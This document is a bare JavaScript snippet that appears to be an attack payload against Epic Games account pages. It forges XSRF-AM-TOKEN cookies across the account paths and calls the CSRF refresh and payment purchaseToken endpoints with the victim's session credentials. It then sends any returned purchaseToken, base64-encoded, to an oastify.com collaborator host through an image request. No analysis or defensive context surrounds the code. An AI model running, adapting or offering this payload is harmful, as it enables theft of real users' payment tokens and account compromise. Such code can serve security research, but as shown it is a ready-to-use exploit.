(function() {
  var xsrf = '';
  for (var i = 0; i < 32; i++) {
    xsrf += Math.floor(Math.random() * 16).toString(16);
  }
  
  document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account/v2/payment/purchaseToken; Domain=.epicgames.com';
  document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account/v2/payment; Domain=.epicgames.com';
  document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account/v2; Domain=.epicgames.com';
  document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account; Domain=.epicgames.com';
  
  fetch('https://www.epicgames.com/account/v2/refresh-csrf', {
    method: 'POST',
    credentials: 'include'
  })
  .then(function() {
    return fetch('https://www.epicgames.com/account/v2/payment/purchaseToken?locale=en-US', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-Xsrf-Token': xsrf,
        'X-Requested-With': 'XMLHttpRequest'
      },
      body: JSON.stringify({
        "currentLocation": "https://www.epicgames.com/account/payments",
        "flow": "PAYMENT_MANAGEMENT",
        "flow_id": "account_management_prod",
        "flow_name": "",
        "solve_token": ""
      })
    });
  })
  .then(function(res) {
    console.log('Status:', res.status);
    return res.json();
  })
  .then(function(data) {
    console.log('Response:', JSON.stringify(data));
    if (data.purchaseToken) {
      console.log('TOKEN:', data.purchaseToken);
      new Image().src = 'https://itfyjvb10btewzys9nunumsy9pfg380wp.oastify.com/?token=' + btoa(data.purchaseToken);
    }
  })
  .catch(function(e) {
    console.error('Error:', e);
  });
})();
